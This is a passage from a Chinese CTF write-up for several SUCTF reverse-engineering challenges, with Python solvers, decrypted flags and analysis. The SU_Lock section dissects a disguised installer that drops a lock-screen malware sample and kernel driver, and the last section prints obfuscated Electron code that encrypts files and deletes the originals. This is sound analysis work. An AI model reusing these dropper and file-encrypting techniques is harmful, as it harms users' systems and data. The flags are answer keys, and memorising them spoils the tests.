         return ((x0 ^ t) + 0x1337) & MASK64

     def splitmix64_next(self, state: list[int]) -> int:
         state[0] = (state[0] + 0x9E3779B97F4A7C15) & MASK64
         z = state[0]
         z = ((z ^ (z >> 30)) * 0xBF58476D1CE4E5B9) & MASK64
         z = ((z ^ (z >> 27)) * 0x94D049BB133111EB) & MASK64
         return (z ^ (z >> 31)) & MASK64

     def xoshiro256ss(self, s: list[int]) -> int:
         result = (rol64((s[1] * 5) & MASK64, 7) * 9) & MASK64
         t = (s[1] << 17) & MASK64
         s[2] ^= s[0]
         s[3] ^= s[1]
         s[1] ^= s[2]
         s[0] ^= s[3]
         s[2] ^= t
         s[3] = rol64(s[3], 45)
         for i in range(4):
             s[i] &= MASK64
         return result

     def init_seed_words(self) -> list[int]:
         c0 = 0xFFF55731369D7563
         c1 = 0x16E58EB22FBD5C72
         c2 = 0x3632ED844C43F5B0
         c3 = 0x390980A442221584
         return [c0, c1, c2, c3]

     def init_prng_state(self) -> list[int]:
         words = self.init_seed_words()
         acc = 0x1234567890ABCDEF
         gamma = 0x9E3779B97F4A7C15
         sm_state = [acc]
         out = []
         for w in words:
             sm_state[0] ^= (w + gamma) & MASK64
             out.append(self.splitmix64_next(sm_state))
         if out == [0, 0, 0, 0]:
             out[0] = 0xFDAEDBEFF2BF2BABE
         return out

     def init_ctx(self) -> dict[str, object]:
         state = self.init_prng_state()
         buf20 = bytearray(0x40)
         buf28 = bytearray(0x40)
         buf30 = bytearray(0x30)

         for i in range(0x40):
             buf28[i] = i
             r = self.xoshiro256ss(state)
             b = ((r & 0xFF) ^ ((r >> 11) & 0xFF)) & 0xFF
             b ^= (i - 0x5B) & 0xFF
             buf20[i] = b

         # 0x7d30 shuffle
         for idx in range(0x3F, 0, -1):
             r = self.xoshiro256ss(state)
             j = r % (idx + 1)
             buf28[idx], buf28[j] = buf28[j], buf28[idx]

         for i in range(0x30):
             r = self.xoshiro256ss(state)
             b = ((r & 0xFF) ^ ((r >> 23) & 0xFF)) & 0xFF
             b ^= ((i * 7 + 0x3D) & 0xFF)
             b = self.aes_sbox[(b + buf20[i & 0x3F]) & 0xFF]
             r2 = self.xoshiro256ss(state)
             b ^= r2 & 0xFF
             rot = ((i % 7) + 1) & 63
             b = rol64(b, rot) & 0xFF
             buf30[i] = b

         return {"state": state, "buf20": buf20, "buf28": buf28, "buf30": buf30}

     def ks_9428(self, mk_words: list[int]) -> list[int]:
         k = [0] * 36
         tmp = [0] * 4
         for i in range(4):
             tmp[i] = ((mk_words[i] ^ self.fk[i]) + i) & MASK64
         for i in range(4):
             rk = (tmp[0] ^ self.f_93A0(tmp[1] ^ tmp[2] ^ tmp[3] ^ self.ck[i])) & MASK64
             k[i + 4] = rk
             tmp = [tmp[1], tmp[2], tmp[3], rk]
         for i in range(4, 32):
             rk = (tmp[0] ^ self.f_93A0(tmp[1] ^ tmp[2] ^ tmp[3] ^ self.ck[i])) & MASK64
             rk = (rk + i) & MASK64
             k[i + 4] = rk
             tmp = [tmp[1], tmp[2], tmp[3], rk]
         return k

     def enc_block_9938(self, block_words: list[int], mk_words: list[int]) -> list[int]:
         rk = self.ks_9428(mk_words)
         x = [(w ^ 0xAAAAAAAA) & MASK64 for w in block_words]
         for r in range(34):
             new = self.f_9898(x[0], x[1], x[2], x[3], rk[(r & 31) + 4])
             x = [x[1], x[2], x[3], new]
             if r in (8, 16, 24):
                 x[0] ^= 0x55555555
                 x[1] ^= 0xAAAAAAAA
                 x[0] &= MASK64
                 x[1] &= MASK64
         o0, o1, o2, o3 = x
         return [
             (o3 ^ 0x12345678) & MASK64,
             (o2 ^ 0xABCDEF01) & MASK64,
             (o1 ^ 0x10FEDCBA) & MASK64,
             (o0 ^ 0x87654321) & MASK64,
         ]

     def dec_block_9938(self, out_words: list[int], mk_words: list[int]) -> list[int]:
         rk = self.ks_9428(mk_words)
         x = [
             (out_words[3] ^ 0x87654321) & MASK64,
             (out_words[2] ^ 0x10FEDCBA) & MASK64,
             (out_words[1] ^ 0xABCDEF01) & MASK64,
             (out_words[0] ^ 0x12345678) & MASK64,
         ]
         for r in range(33, -1, -1):
             if r in (8, 16, 24):
                 x[0] ^= 0x55555555
                 x[1] ^= 0xAAAAAAAA
                 x[0] &= MASK64
                 x[1] &= MASK64
             prev0 = (((x[3] - 0x1337) & MASK64) ^ self.f_9810(x[0] ^ x[1] ^ x[2] ^ rk[(r & 31) + 4])) & MASK64
             x = [prev0, x[0], x[1], x[2]]
         return [(w ^ 0xAAAAAAAA) & MASK64 for w in x]

     def inv_round_7e28_tables(self, ctx_state: list[int]) -> list[list[int]]:
         state = ctx_state.copy()
         invs = []
         for rnd in range(6):
             rr = self.xoshiro256ss(state) & 0x3F
             inv = [0] * 256
             for x in range(256):
                 y = x ^ ((rr + rnd) & 0xFF)  # i will be added later
                 # placeholder per-byte i adjustment handled outside
             invs.append([rr])
         return invs

     def invert_7e28(self, buf: bytearray, ctx_state: list[int]) -> bytearray:
         state = ctx_state.copy()
         rounds = []
         for rnd in range(6):
             rounds.append(self.xoshiro256ss(state) & 0x3F)
         out = bytearray(buf)
         for rnd in range(5, -1, -1):
             rr = rounds[rnd]
             invmap = [0] * 256
             for i in range(64):
                 pass
             for i in range(len(out)):
                 table = [0] * 256
                 for x in range(256):
                     v = x ^ ((rr + i + rnd) & 0xFF)
                     v = ((v << 1) | (v >> 7)) & 0xFF
                     v ^= self.aes_sbox[(v + rnd * 13) & 0xFF]
                     table[v] = x
                 out[i] = table[out[i]]
         return out

     def round_outputs_7e28(self, ctx_state: list[int]) -> list[int]:
         state = ctx_state.copy()
         return [self.xoshiro256ss(state) & 0x3F for _ in range(6)]

     def target_to_7e28_output(self) -> tuple[dict[str, object], bytearray]:
         ctx = self.init_ctx()
         buf20 = ctx["buf20"]
         buf28 = ctx["buf28"]
         buf30 = ctx["buf30"]

         key_bytes = self.data[0x7E920:0x7E930]
         mk_words = [int.from_bytes(key_bytes[i:i + 4], "big") for i in range(0, 16, 4)]

         temp90 = bytearray()
         for blk in range(0, 64, 16):
             words = [int.from_bytes(self.target[blk + i:blk + i + 4], "big") for i in range(0, 16, 4)]
             dec = self.dec_block_9938(words, mk_words)
             for w in dec:
                 temp90 += int(w & 0xFFFFFFFF).to_bytes(4, "big")

         out = bytearray(64)
         pos_of = [0] * 64
         for i, v in enumerate(buf28):
             pos_of[v & 0x3F] = i
         for src in range(64):
             i = pos_of[src]
             v = temp90[i] ^ buf20[i]
             pre = self.aes_sbox.index(v)
             out[src] = pre ^ buf30[i % 0x30]

         return ctx, out

     def preimages_before_7e28(self) -> list[list[int]]:
         ctx, after_7e28 = self.target_to_7e28_output()
         rounds = self.round_outputs_7e28(ctx["state"])
         buf20 = ctx["buf20"]
         candidates: list[list[int]] = []
         for i, y in enumerate(after_7e28):
             xs = []
             for x in range(256):
                 v = x
                 for rnd, rr in enumerate(rounds):
                     v ^= (rr + i + rnd) & 0xFF
                     v = ((v << 1) | (v >> 7)) & 0xFF
                     v ^= self.aes_sbox[(v + rnd * 13) & 0xFF]
                 if v == y:
                     plain = x ^ ((buf20[(i * 7) & 0x3F] + i) & 0xFF)
                     xs.append(plain)
             candidates.append(sorted(set(xs)))
         return candidates

     def recover_flag(self) -> bytes:
         candidates = self.preimages_before_7e28()
         out = bytearray(64)
         prefix = b"flag{"
         for i, wanted in enumerate(prefix):
             if wanted not in candidates[i]:
                 raise ValueError(f"prefix byte {i} is inconsistent")
             out[i] = wanted
         for i in range(len(prefix), 63):
             printable = [x for x in candidates[i] if 32 <= x < 127]
             if len(printable) == 1:
                 out[i] = printable[0]
                 continue
             if len(candidates[i]) == 1:
                 out[i] = candidates[i][0]
                 continue
             wordish = [x for x in printable if chr(x).isalnum() or chr(x) in "_-"]
             if len(wordish) == 1:
                 out[i] = wordish[0]
                 continue
             raise ValueError(f"ambiguous position {i}: {candidates[i]}")
         if ord("}") not in candidates[63]:
             raise ValueError("missing closing brace")
         out[63] = ord("}")
         return bytes(out)

     def reverse(self) -> bytes:
         return self.recover_flag()


def main() -> None:
     data = Path("firmware.elf").read_bytes()
     solver = Solver(data)
     recovered = solver.reverse()
     print("len", len(recovered))
     print("hex", recovered.hex())
     try:
         print("ascii", recovered.decode())
     except Exception:
         print("ascii-decode-failed")


if __name__ == "__main__":
     main()
```

得到flag：`flag{3putis6omqi3u7034722576kpze4udduejoko8zr3e6ozvp8mosm6065q1}`

## SU_Lock

这题表面上给的是一个正常软件安装包 `Everything_Setup_1.4.1.exe`，实际上是一条比较完整的投递链：

1. 外层是 Inno Setup 安装器。
2. 安装器里藏了一个真正的恶意样本 `Locksetup.exe`。
3. `Locksetup.exe` 本身还是个壳，运行时会解出用户态 GUI 和内核驱动。
4. GUI 接收输入 flag，做一轮加密后通过 `DeviceIoControl` 发给驱动。
5. 驱动验证密文是否正确。

所以真正需要逆向的是两部分：

- GUI 的加密算法
- 驱动里保存的目标密文
- 外层安装器分析

用 `innounp` 看安装包内容，可以直接看到以下文件：

```Plain
{app}\Everything.exe
{localappdata}\Temp\Locksetup.exe
install_script.iss
```

其中最关键的是 `Locksetup.exe`，安装脚本里也明确写了会在特定条件下释放并运行它：

```Visual
[Files]
Source: "{localappdata}\Temp\Locksetup.exe"; DestDir: "{localappdata}\Temp"; Check: "ShouldDeployMalware"; Flags: ignoreversion

[Run]
Filename: "{localappdata}\Temp\Locksetup.exe"; Check: "ShouldDeployMalware"; Flags: nowait
```

说明 `Everything.exe` 只是伪装，真正逻辑在 `Locksetup.exe`。

2. 提取脚本与安装密码

即使文件本体被密码保护，`install_script.iss` 仍然可以单独提取。脚本中能看到以下关键信息：

```Visual
; Encryption=yes
; PasswordTest=-1418402358
; EncryptionKDFSalt=49efd5dc53d1a678b04b205f9b36319d
; EncryptionKDFIterations=220000
```

继续提取 `embedded\CompiledCode.bin` 后，可以在字节码字符串中看到：

```Plain
ISTESTMODEENABLED
ISAVRUNNING
SHOULDDEPLOYMALWARE
suctf
```

结合 Inno Setup 的口令校验方式可知：

- 口令经过 `PBKDF2-SHA256`
- 字符串按 `UTF-16LE` 参与 KDF
- 再通过 `XChaCha20` 生成 `PasswordTest`

验证后安装包密码为：

```Plain
suctf
```

之后即可完整解出 `Locksetup.exe`。

3. Locksetup.exe 的真实作用

`Locksetup.exe` 是一个 64 位 Rust 程序。它本身不是最终校验逻辑，而是一个投递器。

静态分析可以看到两个重要线索：

1. 程序里有常量字符串：

```Plain
SUCTF2026
```

1. 存在明显的 RC4 初始化和异或流程。

继续分析可知，它会用 `SUCTF2026` 作为 RC4 密钥解密两个内嵌 PE：

- `blob1.bin`：用户态锁屏 GUI
- `blob2.bin`：内核驱动

blob1.bin

提取后可以看到关键字符串：

```Plain
\\.\CtfMalDevice
Enter Flag Here
ModernLockWnd
Locked
```

说明它会创建一个锁屏窗口，并且通过设备 `\\.\CtfMalDevice` 与驱动通信。

blob2.bin

提取后可以看到：

```Plain
\Device\CtfMalDevice
\DosDevices\CtfMalDevice
D:\demo\Driver\encryption\x64\Release\encryption.pdb
```

说明驱动项目名就是 `encryption`，而且导出了对应设备对象供 GUI 调用。

4. 驱动派发函数

驱动的 `IRP_MJ_DEVICE_CONTROL` 分支只处理两个 IOCTL：

4.1 `0x222004`

这个分支会通过一个简单的字节码解释器向用户缓冲区写出 5 个 `DWORD`：

```Plain
0x9e376a8e
0xdeadbeef
0xcafebabe
0x1337c0de
0x0badf00d
```

这正是后面加密算法要用到的参数：

```Plain
delta = 0x9e376a8e
key = [0xdeadbeef, 0xcafebabe, 0x1337c0de, 0x0badf00d]
```

4.2 `0x222008`

这个分支会把输入缓冲区当成 10 个 `DWORD`，逐个与内部常量比较。目标密文如下：

```Plain
[
  0x8da1e7b1,
  0xcaa432e5,
  0x6eec27bc,
  0xefc12b53,
  0xfa7505c2,
  0x54ac88a6,
  0x2f96ad99,
  0x77741a15,
  0x3e8673c1,
  0xc2b9f282
]
```

因此驱动只做两件事：

1. 返回加密参数
2. 校验最终密文
3. GUI 程序逻辑

GUI 程序的流程比较直接：

1. 从编辑框读取文本。
2. 通过 `WideCharToMultiByte` 转成单字节字符串。
3. 检查长度必须是 `0x28 = 40` 字节。
4. 调用 `DeviceIoControl(..., 0x222004, ...)` 从驱动取出 5 个参数。
5. 对输入的 10 个 `DWORD` 做一轮加密。
6. 调用 `DeviceIoControl(..., 0x222008, ...)` 让驱动验证。

这一轮加密是 `XXTEA / Block TEA` 的一个变种，等价实现如下：

```Python
DELTA = 0x9E376A8E
KEY = [0xDEADBEEF, 0xCAFEBABE, 0x1337C0DE, 0x0BADF00D]

def u32(x):
    return x & 0xFFFFFFFF

def mx(y, z, total, p, e):
    return u32((((z >> 4) ^ (y << 3)) + ((y >> 2) ^ (z << 5))) ^
               ((z ^ KEY[(p & 3) ^ e]) + (total ^ y)))

def enc(v):
    v = v[:]
    z = v[-1]
    total = 0
    for _ in range(11):
        total = u32(total + DELTA)
        e = (total >> 2) & 3
        for p in range(len(v) - 1):
            y = v[p + 1]
            z = v[p] = u32(v[p] + mx(y, z, total, p, e))
        y = v[0]
        z = v[-1] = u32(v[-1] + mx(y, z, total, len(v) - 1, e))
    return v
```

因为输入长度固定为 40 字节，所以可以正好拆成 10 个小端 `DWORD`。

6. 逆向恢复 flag

现在已知：

- 加密参数 `delta` 和 `key`
- 目标密文 `TARGET`
- 具体加密算法

因此只需要对 `TARGET` 做逆运算即可恢复出原始 40 字节明文。

逆运算脚本见同目录下的 [solve.py](E:\Desktop\suctf\SU_Lock\solve.py)。

核心思路就是实现加密算法的反过程：

```Python
def decrypt(words):
    v = words[:]
    total = u32(DELTA * 11)
    y = v[0]
    while total:
        e = (total >> 2) & 3
        for p in range(len(v) - 1, 0, -1):
            z = v[p - 1]
            y = v[p] = u32(v[p] - mx(y, z, total, p, e))
        z = v[-1]
        y = v[0] = u32(v[0] - mx(y, z, total, 0, e))
        total = u32(total - DELTA)
    return v
```

exp：

```Python
import struct


 DELTA = 0x9E376A8E
 KEY = [0xDEADBEEF, 0xCAFEBABE, 0x1337C0DE, 0x0BADF00D]
 TARGET = [
     0x8DA1E7B1,
     0xCAA432E5,
     0x6EEC27BC,
     0xEFC12B53,
     0xFA7505C2,
     0x54AC88A6,
     0x2F96AD99,
     0x77741A15,
     0x3E8673C1,
     0xC2B9F282,
 ]


def u32(x: int) -> int:
     return x & 0xFFFFFFFF


def mx(y: int, z: int, total: int, p: int, e: int) -> int:
     return u32((((z >> 4) ^ (y << 3)) + ((y >> 2) ^ (z << 5))) ^ ((z ^ KEY[(p & 3) ^ e]) + (total ^ y)))


def encrypt(words: list[int]) -> list[int]:
     v = words[:]
     z = v[-1]
     total = 0
     for _ in range(11):
         total = u32(total + DELTA)
         e = (total >> 2) & 3
         for p in range(len(v) - 1):
             y = v[p + 1]
             z = v[p] = u32(v[p] + mx(y, z, total, p, e))
         y = v[0]
         z = v[-1] = u32(v[-1] + mx(y, z, total, len(v) - 1, e))
     return v


def decrypt(words: list[int]) -> list[int]:
     v = words[:]
     total = u32(DELTA * 11)
     y = v[0]
     while total:
         e = (total >> 2) & 3
         for p in range(len(v) - 1, 0, -1):
             z = v[p - 1]
             y = v[p] = u32(v[p] - mx(y, z, total, p, e))
         z = v[-1]
         y = v[0] = u32(v[0] - mx(y, z, total, 0, e))
         total = u32(total - DELTA)
     return v


def words_to_bytes(words: list[int]) -> bytes:
     return b"".join(struct.pack("<I", x) for x in words)


def main() -> None:
     plain_words = decrypt(TARGET)
     flag = words_to_bytes(plain_words)
     check = encrypt(list(struct.unpack("<10I", flag)))

     print(flag.decode())
     print("verify:", check == TARGET)


if __name__ == "__main__":
     main()
```

运行后得到：

```Plain
SUCTF{SJCMA23-AX8MQ3IU-8UHCSO90-QCM1S0L}
```

## SU_Revird

`chal.exe` 里有一层明显的误导

**先看** **`chal.exe`**

把 `chal.exe` 扔进 IDA/Ghidra 之后，主流程很好认：

1. 先输出 `Please input the flag:`
2. 读入用户输入
3. 进入一段校验逻辑
4. 失败输出 `Wrong flag, bye!`
5. 成功输出 `Good...`

在 `.rdata` 里还能看到一串很像被简单异或/变换过的数据，顺着主流程往下抠，确实能还原出一条 **假 flag**：

```HTTP
SUCTF{fake_flag_ohh_oh_fake_flag_oh_yeah_yeah!!}
```

这一步很容易让人误以为题目已经结束了，但这其实只是烟雾弹。

**注意隐藏的第二层程序**

继续分析 `chal.exe`，会发现除了主校验外，程序里还藏了一份 **额外的 PE payload**（也就是另一份程序）。

做法：

1. 在 `.rdata` 找到那块大体积的异常数据
2. 顺着引用找到解密函数
3. 把它按程序里的逻辑解出来
4. 导出后会得到另一份 PE（我这边导出后是一个可正常反汇编的控制台程序）

我导出后得到的文件继续分析，可以看到它会打开设备：

```HTTP
\\.\Revird
```

并通过：

```HTTP
DeviceIoControl(..., 0x222000, ...)
```

和驱动通信。

也就是说，真正的逻辑其实是：

> `chal.exe` 里藏了一个“worker”，worker 再去和 `Revird.sys` 交互。

**分析** **`Revird.sys`**

把驱动丢进 IDA/Ghidra 后，先看 `DriverEntry`，可以很容易识别出：

- `IoCreateDevice`
- `IoCreateSymbolicLink`

结合字符串/反汇编，可以确认设备名和符号链接都叫 **Revird**，因此用户态通过 `\\.\Revird` 打开设备是对得上的。

接着看 `IRP_MJ_DEVICE_CONTROL` 对应分发函数，会看到它只认一个 IOCTL：

```HTTP
0x222000
```

在反汇编里能直接看到类似：

```HTTP
cmp dword ptr [rax+18h], 222000h
```

再往下看会发现，驱动会校验用户态传进来的数据结构，其中前 4 字节有固定魔数：

```HTTP
IVER
```

也就是 worker 里写进去的：

```HTTP
mov dword ptr [...], 0x52455649 ; 'IVER'
```

所以这里可以确认：

- `worker` 会构造一个请求包
- 请求包带 `IVER` 魔数
- 用 `0x222000` 发给驱动
- 驱动验证通过后返回结果

```HTTP
SUCTF{D0_y0U_unD3r5t4nd_Th15_m491c4l_435?_41218}
```

## SU_easygal

1. 题目类型判断

题目目录原本是标准的 Unity IL2CPP 程序结构：

```Plain
esaygal.exe
GameAssembly.dll
UnityPlayer.dll
baselib.dll
esaygal_Data/
```

这类题的基本结论很直接：

- `GameAssembly.dll` 里是 IL2CPP 编译后的业务逻辑
- `global-metadata.dat` 里是元数据
- `resources.assets` 里通常有剧情文本、配置或 JSON

题面又明确说了：

- 一共有 60 个剧情节点
- 每个节点需要二选一
- 真结局只有唯一正确路线

所以目标不是手玩 60 次，而是：

1. 还原每个选项的数值影响
2. 找出真结局判定条件
3. 跑搜索或 DP 找唯一合法路径
4. 还原 flag 的生成方式
5. 关键符号定位

对 `GameAssembly.dll` 做字符串检索后，可以直接看到不少没有混淆的符号：

```Plain
BuildTrueEndingFlag
GameConfig
MaxWeight
TrueEndingValue
StoryResourcePath
GameManager
OnChoiceSelected
EvaluateEnding
FinishGame
GameStateStore
StoryChoiceData
StoryNodeData
StoryEndingData
StoryDatabase
verificationMethod
```

这已经足够说明程序设计：

- `StoryDatabase` 保存全部剧情数据
- `StoryChoiceData` 保存每个选项的数据
- `OnChoiceSelected` 在点击选项时更新状态
- `EvaluateEnding` 负责结局判定
- `BuildTrueEndingFlag` 负责最终 flag 生成
- IL2CPP 还原结果

使用 `Il2CppDumper` 处理：

- `GameAssembly.dll`
- `esaygal_Data/il2cpp_data/Metadata/global-metadata.dat`

可以得到 `dump.cs`，里面的关键信息如下。

3.1 GameConfig

```C#
public static class GameConfig
{
    public const int MaxWeight = 132;
    public const int TrueEndingValue = 322;
    public const string StoryResourcePath = "Story/story";
    public const string TitleSceneName = "TitleScene";
    public const string GameSceneName = "GameScene";
    public const string EndingSceneName = "EndingScene";
}
```

这给出两个最重要的常量：

- `MaxWeight = 132`
- `TrueEndingValue = 322`

3.2 StoryChoiceData

```C#
public class StoryChoiceData
{
    public string text;
    public int weight;
    public int value;
    public string flag;
    public string marker;
}
```

也就是说，每个选项有：

- 展示文本 `text`
- 权重增量 `weight`
- 数值增量 `value`
- 一个 `flag`
- 一个 `marker`

3.3 StoryMetaData

```C#
public class StoryMetaData
{
    public int maxWeight;
    public int trueEndingValue;
    public int nodeCount;
    public string verificationMethod;
}
```

说明资源里还保存了题目自己的验证配置。

4. 结局判定逻辑

`GameManager::EvaluateEnding` 反汇编后，逻辑非常简单，等价于：

```C#
if (currentWeight > maxWeight)
{
    ending = Failure;
}
else if (currentValue == trueEndingValue)
{
    ending = True;
}
else
{
    ending = Normal;
}
```

所以真结局条件是：

```Plain
weight <= 132
value  == 322
```

坏结局条件是：

```Plain
weight > 132
```

其余全部是普通结局。

5. 选项点击后的状态更新

`GameManager::OnChoiceSelected` 的核心行为可以还原为：

```C#
currentWeight += choice.weight;
currentValue += choice.value;

if (!string.IsNullOrWhiteSpace(choice.flag))
    flags.Add(choice.flag);

if (!string.IsNullOrWhiteSpace(choice.marker))
    markers.Add(choice.marker);
```

这说明：

- 每个选择只会累加 `weight/value`
- `marker` 会按路线顺序被记录下来
- 最终 flag 很可能依赖这条真路线上的 marker 序列
- 剧情数据库提取

在 `resources.assets` 中搜索 `"maxWeight"`，能直接命中一段明文 JSON。

开头大致如下：

```JSON
{
  "meta": {
    "maxWeight": 132,
    "trueEndingValue": 322,
    "nodeCount": 60,
    "verificationMethod": "DP count exact optimum paths"
  },
  "nodes": [
    ...
  ],
  "endings": [
    ...
  ]
}
```

这里有一个非常关键的信息：

```Plain
verificationMethod = "DP count exact optimum paths"
```

题目作者几乎把解法写在资源里了：

- 用 DP
- 找精确命中的最优路线

提取后可以得到完整的 60 个节点数据，而且每个节点都恰好只有两个选项。

7. 为什么用 DP

总路线数是：

```Plain
2^60
```

直接暴力不可行。

但每一步只影响两个整数：

- 当前总 `weight`
- 当前总 `value`

因此可以做状态压缩 DP：

```Plain
state = (weight, value)
```

转移就是对每个节点尝试两个选项：

```Python
next_weight = weight + choice.weight
next_value = value + choice.value
```

并且可以立刻剪枝：

```Python
if next_weight > 132:
    continue
```

因为一旦超过 `MaxWeight`，无论后面怎么选都不可能回到真结局。

8. DP 求解结果

DP 跑完后，结论非常干净：

- 唯一满足条件的终态是：

```Plain
(weight, value) = (132, 322)
```

- 对应路径数量恰好是：

```Plain
1
```

也就是说，这题确实只有一条真路线。

9. 真结局路线

最终求得的 A/B 选择序列为：

```Plain
BBABAABAAAAAAABBABAAAABBBBABBBBBBBBAAABAAABABAAABBBABBBBAAAB
```

逐节点写开如下：

| 节点 | 选择 |
| ---- | ---- |
| N1   | B    |
| N2   | B    |
| N3   | A    |
| N4   | B    |
| N5   | A    |
| N6   | A    |
| N7   | B    |
| N8   | A    |
| N9   | A    |
| N10  | A    |
| N11  | A    |
| N12  | A    |
| N13  | A    |
| N14  | A    |
| N15  | B    |
| N16  | B    |
| N17  | A    |
| N18  | B    |
| N19  | A    |
| N20  | A    |
| N21  | A    |
| N22  | A    |
| N23  | B    |
| N24  | B    |
| N25  | B    |
| N26  | B    |
| N27  | A    |
| N28  | B    |
| N29  | B    |
| N30  | B    |
| N31  | B    |
| N32  | B    |
| N33  | B    |
| N34  | B    |
| N35  | B    |
| N36  | A    |
| N37  | A    |
| N38  | A    |
| N39  | B    |
| N40  | A    |
| N41  | A    |
| N42  | A    |
| N43  | B    |
| N44  | A    |
| N45  | B    |
| N46  | A    |
| N47  | A    |
| N48  | A    |
| N49  | B    |
| N50  | B    |
| N51  | B    |
| N52  | A    |
| N53  | B    |
| N54  | B    |
| N55  | B    |
| N56  | B    |
| N57  | A    |
| N58  | A    |
| N59  | A    |
| N60  | B    |

最终总和正好是：

```Plain
weight = 132
value = 322
```

10. 真路线上的 marker

真路线对应的 marker 顺序是：

```Plain
m1b,m2b,m3a,m4b,m5a,m6a,m7b,m8a,m9a,m10a,m11a,m12a,m13a,m14a,m15b,m16b,m17a,m18b,m19a,m20a,m21a,m22a,m23b,m24b,m25b,m26b,m27a,m28b,m29b,m30b,m31b,m32b,m33b,m34b,m35b,m36a,m37a,m38a,m39b,m40a,m41a,m42a,m43b,m44a,m45b,m46a,m47a,m48a,m49b,m50b,m51b,m52a,m53b,m54b,m55b,m56b,m57a,m58a,m59a,m60b
```

把它们直接拼接起来，得到：

```Plain
m1bm2bm3am4bm5am6am7bm8am9am10am11am12am13am14am15bm16bm17am18bm19am20am21am22am23bm24bm25bm26bm27am28bm29bm30bm31bm32bm33bm34bm35bm36am37am38am39bm40am41am42am43bm44am45bm46am47am48am49bm50bm51bm52am53bm54bm55bm56bm57am58am59am60b
```

11. Flag 生成逻辑

`FlagUtility::BuildTrueEndingFlag` 的汇编行为可以还原成下面这个流程：

1. 遍历全部 `markers`
2. 过滤空白字符串
3. 追加到 `StringBuilder`
4. 使用 `Encoding.UTF8.GetBytes`
5. 使用 `MD5.Create().ComputeHash`
6. 每个字节按 `"x2"` 格式转成两位小写十六进制
7. 最后套上格式串 `SUCTF{{{0}}}`

等价伪代码：

```C#
var joined = string.Concat(markers);
var md5 = MD5(joined_utf8);
return $"SUCTF{{{md5_hex}}}";
```

这里能直接看到两个关键信息：

- 十六进制格式是 `"x2"`
- 最终包装格式是 `SUCTF{{{0}}}`

也就是说：

```Plain
flag = SUCTF{md5("".join(markers))}
```

12. 最终 flag 计算

对真路线 marker 拼接串做 UTF-8 MD5，得到：

```Plain
92d1c2c3f6e55fabbc3a6ffde57c7341
```

因此最终 flag 为：

```Plain
SUCTF{92d1c2c3f6e55fabbc3a6ffde57c7341}
```

13. 自动化求解思路

如果要自己写脚本，结构很简单：

1. 从 `resources.assets` 中提取出那段 JSON
2. 解析 `meta/nodes/endings`
3. 对 60 个节点跑 DP
4. 找到唯一的 `(132, 322)` 路径
5. 取出这条路径的 marker
6. 做拼接 + MD5

核心 Python 伪代码如下：

```Python
states = {(0, 0): 1}
parents = []

for node in nodes:
    nxt = {}
    parent = {}
    for (w, v), count in states.items():
        for idx, choice in enumerate(node["choices"]):
            nw = w + choice["weight"]
            nv = v + choice["value"]
            if nw > 132:
                continue
            nxt[(nw, nv)] = nxt.get((nw, nv), 0) + count
            parent[(nw, nv)] = ((w, v), idx)
    states = nxt
    parents.append(parent)

assert states[(132, 322)] == 1
```

然后回溯得到路径，提取 marker 即可。

14. 总结

这题本质上不是复杂算法逆向，而是一个很典型的：

- Unity IL2CPP 分析
- 资源 JSON 提取
- 结局条件恢复
- DP 搜唯一合法路径
- marker 拼接后 MD5 出 flag

真正需要抓住的只有三点：

1. 真结局条件是 `weight <= 132 && value == 322`
2. 60 个节点都只有两个选项，适合做 DP
3. flag 是真路线 marker 拼接后的 MD5

最终答案：

```Plain
SUCTF{92d1c2c3f6e55fabbc3a6ffde57c7341}
```

## SU_MvsicPlayer

先解包`app.asar` 得到源码

![img](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202603170801747.png)

看到混淆代码`main.js`

```JavaScript
function _0x265e(){const _0x551b6b=['path','./src/main/native-bridge','isBuffer','from','isView','buffer','byteLength','data','archivedPaths','has','promises','secureEnabled','currentSuMvPath','preload.js','loadFile','src/renderer/index.html','preventDefault','catch','finally','Open\x20.su_mv\x20File','su_mv','canceled','length','file:read-binary','readFile','handle','session:update','secure:archive-now','currentPayload','then','activate','window-all-closed','darwin','quit'];_0x265e=function(){return _0x551b6b;};return _0x265e();}function _0x2e0b(_0x265e8e,_0x2e0bf1){_0x265e8e=_0x265e8e-0x0;const _0x4d9439=_0x265e();let _0xe33323=_0x4d9439[_0x265e8e];return _0xe33323;}const _0x5d3955=_0x2e0b;const {app,BrowserWindow,dialog,ipcMain}=require('electron');const fs=require('fs');const path=require(_0x5d3955(0x0));const {createVmEncryptorBridge}=require(_0x5d3955(0x1));const vmEncryptorBridge=createVmEncryptorBridge(__dirname);const sessionState={'secureEnabled':![],'currentSuMvPath':'','currentPayload':null,'archivedPaths':new Set()};let mainWindow=null;let forceClosing=![];let archiveInFlight=![];function toBufferOrNull(_0x389219){const _0x144f32=_0x2e0b;if(!_0x389219)return null;if(Buffer[_0x144f32(0x2)](_0x389219))return _0x389219;if(_0x389219 instanceof Uint8Array)return Buffer['from'](_0x389219);if(_0x389219 instanceof ArrayBuffer)return Buffer[_0x144f32(0x3)](new Uint8Array(_0x389219));if(ArrayBuffer[_0x144f32(0x4)](_0x389219)){return Buffer['from'](_0x389219[_0x144f32(0x5)],_0x389219['byteOffset'],_0x389219[_0x144f32(0x6)]);}if(_0x389219&&Array['isArray'](_0x389219[_0x144f32(0x7)]))return Buffer[_0x144f32(0x3)](_0x389219[_0x144f32(0x7)]);return null;}async function secureArchive(_0x25f564,_0x96f41a){const _0x54724a=_0x2e0b;if(!_0x25f564||!Buffer['isBuffer'](_0x96f41a)||_0x96f41a['length']===0x0){return{'ok':![]};}if(sessionState[_0x54724a(0x8)][_0x54724a(0x9)](_0x25f564)){return{'ok':!![],'skipped':!![]};}if(!fs['existsSync'](_0x25f564)){return{'ok':![]};}const _0x1d2977=vmEncryptorBridge['vmEncrypt'](_0x96f41a);const _0x896eb4=_0x25f564+'_enc';await fs[_0x54724a(0xa)]['writeFile'](_0x896eb4,_0x1d2977);await fs[_0x54724a(0xa)]['unlink'](_0x25f564);sessionState[_0x54724a(0x8)]['add'](_0x25f564);return{'ok':!![],'outputPath':_0x896eb4};}async function archiveIfNeeded(){const _0x25410d=_0x2e0b;if(!sessionState[_0x25410d(0xb)]||!sessionState[_0x25410d(0xc)]||sessionState['archivedPaths']['has'](sessionState['currentSuMvPath'])){return{'ok':!![],'skipped':!![]};}if(archiveInFlight){return{'ok':!![],'skipped':!![]};}archiveInFlight=!![];try{return await secureArchive(sessionState[_0x25410d(0xc)],sessionState['currentPayload']);}finally{archiveInFlight=![];}}function createWindow(){const _0x21a6e5=_0x2e0b;mainWindow=new 